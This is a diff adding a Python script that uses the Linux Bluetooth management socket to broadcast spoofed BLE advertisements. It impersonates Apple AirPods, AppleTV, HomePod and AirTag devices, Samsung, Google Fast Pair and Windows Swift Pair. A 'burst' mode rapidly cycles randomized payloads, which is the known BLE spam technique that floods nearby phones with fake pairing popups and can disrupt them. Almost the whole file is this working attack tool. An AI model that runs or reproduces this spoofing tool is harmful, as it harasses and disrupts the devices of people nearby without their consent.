@@ -1,0 +1,323 @@
+#!/usr/bin/env python3
+# xcut-ble-raw - BLE advertiser via the kernel MGMT control channel.
+# Use is: on <mode> [arg] | off | check
+#   modes: airtag|airpods|appletv|homepod|samsung|
+#          android <name>|windows <text>|ibeacon|all
+# Uses local BT adapter hci0 (index 0). No bluetoothd needed, but it may
+# run alongside it.
+import ctypes
+import os
+import random
+import signal
+import socket
+import struct
+import sys
+import time
+
+AF_BLUETOOTH = 31
+SOL_HCI = 0
+BTPROTO_HCI = 1
+HCI_CHANNEL = 4
+HCI_CHANNEL_CONTROL = 3
+
+
+class _SockaddrHCI(ctypes.Structure):
+    _fields_ = [("family", ctypes.c_ushort),
+                ("dev", ctypes.c_ushort),
+                ("channel", ctypes.c_ushort)]
+
+
+def bind_control(sock, dev=None):
+    if dev is None:
+        dev = HCI_DEV_NONE
+    libc = ctypes.CDLL(None, use_errno=True)
+    sa = _SockaddrHCI(AF_BLUETOOTH, dev, HCI_CHANNEL_CONTROL)
+    if libc.bind(sock.fileno(), ctypes.byref(sa), ctypes.sizeof(sa)) != 0:
+        err = ctypes.get_errno()
+        raise OSError(err, f"control bind failed ({os.strerror(err)})")
+
+AF_BLUETOOTH = 31
+SOL_HCI = 0
+BTPROTO_HCI = 1
+HCI_CHANNEL = 4
+HCI_CHANNEL_CONTROL = 3
+
+HCI_DEV_NONE = 0xFFFF
+MGMT_INDEX_NONE = 0xFFFF
+MGMT_OP_READ_INDEX_LIST = 0x0003
+MGMT_OP_READ_ADV_FEATURES = 0x003D
+MGMT_OP_ADD_ADVERTISING = 0x003E
+MGMT_OP_REMOVE_ADVERTISING = 0x003F
+MGMT_OP_ADD_EXT_ADV_PARAMS = 0x0054
+MGMT_OP_ADD_EXT_ADV_DATA = 0x0055
+
+MGMT_EV_CMD_COMPLETE = 0x0001
+MGMT_EV_CMD_STATUS = 0x0002
+MGMT_EV_ADVERTISING_ADDED = 0x0023
+MGMT_EV_ADVERTISING_REMOVED = 0x0024
+
+MGMT_ADV_FLAG_SEC_1M = 1 << 7
+
+STATUS = {0: "success", 1: "unknown-cmd", 2: "not-connected", 3: "failed",
+          0x0a: "busy", 0x0c: "not-supported", 0x0d: "invalid-params",
+          0x0e: "disconnected", 0x0f: "not-powered", 0x11: "invalid-index"}
+
+
+class Mgmt:
+    def __init__(self, dev=0):
+        self.dev = dev
+        self.sock = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_HCI)
+        bind_control(self.sock, HCI_DEV_NONE)
+        self.sock.settimeout(2.5)
+        self.buf = b""
+
+    def _recv_pkt(self):
+        while len(self.buf) < 6:
+            self.buf += self.sock.recv(65536)
+        op, idx, n = struct.unpack("<HHH", self.buf[:6])
+        while len(self.buf) < 6 + n:
+            self.buf += self.sock.recv(65536)
+        body = self.buf[6:6 + n]
+        self.buf = self.buf[6 + n:]
+        return op, idx, body
+
+    def _drain(self, want):
+        while True:
+            try:
+                op, idx, body = self._recv_pkt()
+            except socket.timeout:
+                return None
+            except OSError as e:
+                print(f"recv err: {e}")
+                return None
+            if op == MGMT_EV_CMD_COMPLETE and len(body) >= 3:
+                cmd, status = struct.unpack("<HB", body[:3])
+                if cmd == want:
+                    return status, body[3:]
+            elif op == MGMT_EV_CMD_STATUS and len(body) >= 3:
+                cmd, status = struct.unpack("<HB", body[:3])
+                if cmd == want:
+                    return status, b""
+
+    def _raw(self, cmd, index, payload):
+        self.sock.sendall(struct.pack("<HHH", cmd, index, len(payload)) + payload)
+        return self._drain(cmd)
+
+    def send_global(self, cmd, payload=b""):
+        return self._raw(cmd, MGMT_INDEX_NONE, payload)
+
+    def send(self, cmd, payload=b""):
+        return self._raw(cmd, self.dev, payload)
+
+
+def index_list(m):
+    r = m.send_global(MGMT_OP_READ_INDEX_LIST)
+    if not r or r[0] != 0:
+        return []
+    body = r[1]
+    if len(body) < 2:
+        return []
+    cnt = struct.unpack("<H", body[:2])[0]
+    return list(struct.unpack(f"<{cnt}H", body[2:2 + cnt * 2]))
+
+
+def adv_features(m):
+    r = m.send(MGMT_OP_READ_ADV_FEATURES)
+    if not r or r[0] != 0:
+        return {}
+    b = r[1]
+    return {"flags": struct.unpack("<I", b[0:4])[0],
+            "max_adv": b[4], "max_scan": b[5],
+            "max_inst": b[6], "num_inst": b[7],
+            "instances": list(b[8:8 + b[7]])}
+
+
+def add_legacy(m, inst, data, flags=0):
+    p = struct.pack("<BIHHBB", inst, flags, 0, 0, len(data), 0) + data
+    r = m.send(MGMT_OP_ADD_ADVERTISING, p)
+    if not r:
+        return None, "no reply"
+    if r[0] != 0:
+        return None, f"legacy add status 0x{r[0]:02x} {STATUS.get(r[0])}"
+    return inst, None
+
+
+def add_ext(m, inst, data, flags=0):
+    # min/max interval in 0.125ms units (safe and >= HCI minimums)
+    p = struct.pack("<BIHHIIb", inst, flags | MGMT_ADV_FLAG_SEC_1M, 0, 0,
+                    0x00A0, 0x01F4, -1)  # min 20ms, max ~60ms, tx auto
+    r = m.send(MGMT_OP_ADD_EXT_ADV_PARAMS, p)
+    if not r or r[0] != 0:
+        return None, f"ext params {hex(r[0]) if r else 'no-reply'}"
+    p = struct.pack("<BBB", inst, len(data), 0) + data
+    r = m.send(MGMT_OP_ADD_EXT_ADV_DATA, p)
+    if not r or r[0] != 0:
+        return None, f"ext data {hex(r[0]) if r else 'no-reply'}"
+    return inst, None
+
+
+class Adv:
+    def __init__(self):
+        self.instances = []
+        self.ext = False
+        self._next = 1
+
+    def add(self, payload):
+        inst = self._next
+        self._next += 1
+        data = bytes([len(payload)]) + payload
+        wire, err = add_legacy(m, inst, data)
+        if wire is None:
+            wire, err = add_ext(m, inst, data)
+            if wire is not None:
+                self.ext = True
+        if wire is None:
+            print(f"  add failed ({err or 'no reply'})")
+            return
+        self.instances.append(wire)
+        print(f"  adv instance {wire} {'ext' if self.ext else 'legacy'} data {len(payload)+1}b")
+
+    def remove(self):
+        for i in self.instances:
+            m.send(MGMT_OP_REMOVE_ADVERTISING, struct.pack("B", i))
+        self.instances = []
+
+
+def apple(raw):
+    return bytes.fromhex("ff004c" + raw)
+
+
+APPLE = {
+    "airpods":     "0719022075aa30010000451212120000000000000000000000",
+    "airpodspro":  "0719070e2075aa30010000451212120000000000000000000000",
+    "airpodsmax":  "0719070a2075aa30010000451212120000000000000000000000",
+    "airpods2":    "0719070f2075aa30010000451212120000000000000000000000",
+    "airpods3":    "071907132075aa30010000451212120000000000000000000000",
+    "airpodsp2":   "071907142075aa30010000451212120000000000000000000000",
+    "appletvpair": "04042a0000000f05c106604c9500001000000000000000000000",
+    "appletvset":  "04042a0000000f05c101604c9500001000000000000000000000",
+    "appletvcfg":  "04042a0000000f05c120604c9500001000000000000000000000",
+    "homepod":     "04042a0000000f05c10b604c9500001000000000000000000000",
+}
+
+
+def samsung():
+    return bytes.fromhex("ff0075" + "42098102141503210109ab0c0146063cdd0a00000000a700")
+
+
+def fp2(name):
+    d = bytes.fromhex({"pixelbuds": "92bbbd", "google": "000006"}.get(name, "000006"))
+    out = bytearray([0x02, 0x01, 0x06])
+    out += bytearray([len(d) + 3, 0x16, 0x2C, 0xFE]) + d
+    out += bytearray([0x02, 0x0A, 0x00, 0x05, 0x03, 0x2C, 0xFE])
+    return bytes(out)
+
+
+def windows(text="xcut"):
+    return bytes.fromhex("ff0006" + "030008") + text.encode()[:10]
+
+
+def ibeacon():
+    return bytes.fromhex("ff004c0215" + "2f234454cf6d4a0fadf2c4913600ff00" + "00010007be")
+
+
+def findmy():
+    return bytes([0x1E, 0xFF, 0x00, 0x4C, 0x12, 0x19, 0x10]) + random.randbytes(24)
+
+
+def payloads(mode, extra):
+    if mode == "airpods":
+        return [apple(v) for v in APPLE.values() if v.startswith("0719")]
+    if mode == "airtag":
+        return [findmy()]
+    if mode == "appletv":
+        return [apple(APPLE["appletvpair"])]
+    if mode == "homepod":
+        return [apple(APPLE["homepod"])]
+    if mode == "samsung":
+        return [samsung()]
+    if mode == "android":
+        return [fp2(extra)]
+    if mode == "windows":
+        return [windows(extra)]
+    if mode == "ibeacon":
+        return [ibeacon()]
+    if mode == "all":
+        return ([apple(v) for v in APPLE.values() if v.startswith("0719")] +
+                [samsung(), windows(), fp2("google")])
+    raise ValueError(mode)
+
+
+def run_burst(m, adv, payload, cap, delay=0.04):
+    signal.signal(signal.SIGTERM, lambda s, f: (_ for _ in ()).throw(KeyboardInterrupt()))
+    print(f"burst: {len(payload)} payload pool, cycling {cap} instances (churn mode)")
+    try:
+        while True:
+            for off in range(0, len(payload), cap):
+                adv.remove()
+                time.sleep(0.03)
+                adv._next = 1
+                for p in payload[off:off + cap]:
+                    adv.add(p)
+                time.sleep(delay)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        adv.remove()
+        print("burst stopped, instances removed")
+
+
+def main():
+    if len(sys.argv) < 2:
+        print(__doc__)
+        sys.exit(2)
+    global m
+    m = Mgmt(0)
+    ids = index_list(m)
+    print(f"mgmt up  index {m.dev}  controllers: {ids or 'none'}")
+    feat = adv_features(m)
+    print(f"adv features: flags=0x{feat.get('flags',0):08x} inst={feat.get('max_inst')}"
+          f" used={feat.get('num_inst')} max_adv={feat.get('max_adv')}")
+    adv = Adv()
+    cmd = sys.argv[1]
+    cap = max(1, min(feat.get("max_inst", 12), 12))
+    if cmd == "burst":
+        mode = sys.argv[2] if len(sys.argv) > 2 else "all"
+        extra = sys.argv[3] if len(sys.argv) > 3 else ""
+        pool = payloads(mode, extra)
+        if mode == "airtag":
+            pool = [findmy() for _ in range(cap * 4)]
+        elif mode == "all":
+            pool += [findmy() for _ in range(cap * 2)]
+        run_burst(m, adv, pool, cap)
+        return
+    if cmd == "off":
+        r = m.send(MGMT_OP_READ_ADV_FEATURES)
+        if r and r[0] == 0:
+            insts = list(r[1][8:8 + r[1][7]])
+            for i in insts:
+                m.send(MGMT_OP_REMOVE_ADVERTISING, struct.pack("B", i))
+            print("removed", len(insts), "instance(s)")
+        return
+    if cmd == "check":
+        return
+    if cmd != "on":
+        print(__doc__)
+        sys.exit(2)
+    mode = sys.argv[2] if len(sys.argv) > 2 else "airpods"
+    extra = sys.argv[3] if len(sys.argv) > 3 else ""
+    items = payloads(mode, extra)
+    for p in items[:cap]:
+        adv.add(p)
+    print(f"broadcasting {len(items)} payload(s); Ctrl-C to stop")
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        adv.remove()
+        print("instances removed")
+
+
+main()
